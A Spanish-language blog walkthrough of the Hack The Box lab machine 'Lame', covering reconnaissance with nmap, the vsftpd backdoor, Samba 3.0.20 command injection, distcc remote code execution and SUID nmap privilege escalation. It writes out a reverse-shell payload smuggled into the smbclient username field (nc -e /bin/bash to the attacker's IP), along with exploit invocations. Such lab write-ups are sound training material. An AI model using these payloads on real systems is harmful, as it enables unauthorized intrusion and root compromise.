---
title: Lame - Hack The Box
categories: []
published: true
lang: es
---

![Info Card](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}

Hoy vamos a estar resolviendo la máquina _Lame_ de _Hack The Box_. Es una máquina _Linux_ de nivel de dificultad fácil en la intrusión y fácil en la escalada de privilegios.

Esta máquina nos permite realizar la intrusión mediante dos vías potenciales, de las cuales una de ellas nos requiere de post-explotación. Pese a su baja dificultad, contamos con varios métodos para realizar la misma explotación; por lo que es genial para aprender diferentes vías para realizar un mismo proceso.

### [](#header-3)Fase De Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 10.10.10.3
```

![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `63`, por lo que podemos intuir que estamos ante una máquina _Linux_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

Si nos damos cuenta, en esta ocasión, el valor del _TTL_ es `63` y no `64` como indica la tabla anterior, esto se debe a que en el entorno de máquinas de _Hack The Box_, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el _TTL_ disminuye en una unidad.

```
ping -c 1 10.10.10.3 -R
``` 

![3](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/3a.png){:class="blog-image" onclick="expandImage(this)"}

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n 10.10.10.3
```

En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.

```bash
nmap -sC -sV -p 21,22,139,445,3632 10.10.10.3
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con `FTP` (File Transfer Protocol), `SMB` (Server Message Block)  y `distcc`.

### [](#header-3)Fase De Explotación - Samba

Lo primero que podemos hacer es enumerar el servicio `FTP`. Para esto, utilizaremos un _null session_, ya que no contamos con credenciales; sin embargo, no encontraremos nada.

```bash
ftp anonymous@10.10.10.3
```

![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}

Lo siguiente que podemos hacer es analizar nuestro escaneo de _Nmap_, donde observamos que el servidor `FTP` al que nos enfrentamos es `vsftpd`, específicamente en su versión `2.3.4`. Si investigamos un poco, descubriremos que esta versión tiene una vulnerabilidad en la que se introdujo una puerta trasera en el código fuente. Esta vulnerabilidad añadía un condicional durante la autenticación que buscaba los caracteres "_:)_" (una carita feliz) al final del nombre de usuario y, si los encontraba, ejecutaba una función adicional: _vsf_sysutil_extra()_. Esta función abría un socket TCP en el puerto `6200`, que al recibir una conexión, lanzaba una shell. Puedes encontrar más detalles sobre esta vulnerabilidad en [este artículo](https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/). Por lo tanto, podemos intentar explotar esta vulnerabilidad.


Lo primero que haremos será conectarnos al servicio `FTP` mediante _Telnet_:

```bash
telnet 10.10.10.3 21
```

A continuación, introduciremos un nombre de usuario cualquiera seguido de "_:)_" y una contraseña cualquiera:

```bash
USER usuario:)
PASS p@$$w0rd!
```

Luego, podemos dejar la consola de _Telnet_ colgada utilizando `Ctrl + ]`. Posteriormente, intentaremos conectarnos a la máquina víctima en el puerto `6200` utilizando _Netcat_:

```bash
nc 10.10.10.3 6200
```

![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}

Brevemente, nos daremos cuenta de que ninguna conexión se establece por más que intentemos o esperemos, por lo que podemos asumir que la vulnerabilidad en esta máquina fue parcheada. Por lo tanto, pasaremos a enumerar el siguiente protocolo que hemos identificado durante nuestro escaneo con _Nmap_: `SMB`.

Para esto, haremos uso de `SMBMap` o `smbclient` para comprobar si la máquina cuenta con recursos compartidos a nivel de red, nuevamente utilizando un _null session_, ya que no contamos con credenciales:

```bash
smbmap -H 10.10.10.3
```

```bash
smbclient -N -L 10.10.10.3
```

![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}

Vemos que tenemos permisos de lectura y escritura sobre un recurso llamado `tmp`. Podemos listar el contenido de este recurso con cualquiera de los siguientes comandos:

```bash
smbmap -H 10.10.10.3 -r tmp
```

```bash
smbclient -N //10.10.10.3/tmp
```

Sin embargo, no encontramos nada de interés en este recurso.

![7](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}

Nuevamente, podemos regresar a nuestro escaneo con _Nmap_ y observar que el servicio _Samba_ está ejecutando la versión `3.0.20`. Por lo tanto, podemos investigar si esta versión es vulnerable a algún tipo de exploit. Esto podemos hacerlo buscando en línea, por ejemplo, en _Exploit Database_, o directamente desde la consola usando `searchsploit`.

```bash
searchsploit samba 3.0.20
```

![8](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}

Encontramos una vulnerabilidad que se explota cuando la opción de configuración `username map script` está activa (no habilitada por defecto). Al especificar un nombre de usuario que contenga _metacaracteres de shell_, es posible conseguir ejecución remota de comandos sin necesidad de autenticación previa.

Sin embargo, el exploit que encontramos utiliza _Metasploit_, lo cual no se alinea con la metodología que seguimos. No obstante, al examinar el script que encontramos con:

```bash
searchsploit -x 16320
```

![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}

Podemos observar que lo único que hace el exploit es proporcionar el comando que queremos ejecutar como nombre de usuario y una cadena de caracteres arbitraria como contraseña. Así que, entendiendo el script, podemos replicar manualmente la misma explotación usando `smbclient` sin necesidad de scripts automatizados.

Para ello, nos pondremos en escucha a través de _Netcat_ y ejecutaremos el siguiente comando:

```bash
smbclient //10.10.10.3 -U "/=`nohup nc -e /bin/bash <nuestraIP> <puertoCualquiera>`"
```

![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}

No obstante, esto no dará los resultados esperados, ya que aunque conseguimos una shell, se conecta a nuestro propio equipo de atacantes. Al revisar el exploit, podemos observar que este utiliza el protocolo `NTLMv1`, por lo que también podemos intentar especificar este protocolo en `smbclient` de la siguiente manera:

```bash
smbclient //10.10.10.3 -U "/=`nohup nc -e /bin/bash <nuestraIP> <puertoCualquiera>`" --option='client min protocol=NT1'
```

![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}

Sin embargo, obtendremos el mismo resultado. En este punto, podemos intentar escribir un script similar en _Python_ para ver si conseguimos algún resultado diferente. Para ello, utilizaremos la [documentación](https://pysmb.readthedocs.io/en/latest/api/smb_SMBConnection.html) de `pysmb` para guiarnos en la creación del script.

Primero, instalaremos `pysmb`:

```bash
pip install pysmb
```

Al revisar la documentación, vemos que los parámetros _username_, _password_, _my_name_, y _remote_name_ son obligatorios. Sin embargo, podemos dejar _my_name_ y _remote_name_ vacíos. En el parámetro _username_ es donde colocaremos nuestro comando a ejecutar, y el campo _password_ lo podemos también dejar vacío. El script se vería algo así:

![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}

Curiosamente, ahora si conseguimos una consola dentro de la máquina víctima. Esto probablemente se debe a que las versiones actuales de `smbclient` están configuradas para prevenir este tipo de ataques. De todos modos, logramos obtener acceso como `root`, lo que nos permite visualizar las dos flags.

![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}

No obstante, no me quería quedar de brazos cruzados, ya que la curiosidad me llevó a seguir intentando esta explotación usando `smbclient`. Encontré que si nos conectamos al servicio `SMB` mediante el uso del mismo _null session_ y utilizamos el comando `logon` para cambiar de usuario, podemos introducir el comando a ejecutar directamente en ese campo y así explotar el `SMB`.

![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Fase De Explotación - distcc

La siguiente vía de explotación que podemos encontrar es a través del servicio `distcc`. Si volvemos a nuestro escaneo con _Nmap_, veremos que el servicio `distcc` está corriendo la versión `4.2.4`.

Aunque existen scripts que hacen uso de _Metasploit_ para explotar esta vulnerabilidad, también encontramos un [exploit](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855#file-distccd_rce_cve-2004-2687-py) del usuario `DarkCoderSc` en GitHub que realiza la explotación de forma manual.

Este exploit nos proporciona ejecución remota de comandos, y podemos probarlo de la siguiente forma:

```bash
python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'ifconfig; whoami'
```

![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}

Al ejecutar el script, confirmamos que estamos dentro de la máquina víctima. Sin embargo, a diferencia de la vía anterior, ahora tenemos acceso como el usuario `daemon` en lugar de _root_. Esto nos indica que necesitaremos escalar privilegios para comprometer por completo el sistema.

El siguiente paso será establecer una reverse shell hacia nuestro equipo de atacantes, pudiendo así listar la primera flag.

![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Escalada De Privilegios

Para realizar esta última fase, podemos aprovechar binarios con permisos `SUID` mal asignados, lo que nos permitirá escalar privilegios. Para listar todos los binarios con permisos `SUID` asignados en la máquina, podemos utilizar los siguientes comandos:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}

La mejor forma para abusar de cualquier binario, es recurrir a [GTFOBins](https://gtfobins.github.io/), esta página nos enseña como explotar binarios con _capabilities_ mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos `SUID` mal asignados.

El binario más interesante que encontramos es `nmap`, que está ejecutando una versión antigua. Esta versión contaba con un modo interactivo que podemos utilizar para invocar una shell. Dado que nmap tiene permisos `SUID`, la shell se ejecutará como el usuario `root`, permitiéndonos así listar la última flag del sistema.

![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Autopwn Script

Adicionalmente, desarrollé un script autopwn disponible públicamente en mi repositorio de [GitHub](https://github.com/MateoNitro550/HTB-Autopwn-Scripts/blob/main/Lame/autopwn_lame.py). Este script automatiza la explotación y escalada de privilegios en la máquina, cubriendo las técnicas explicadas y sirviendo como guía para entender el proceso de explotación.

![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
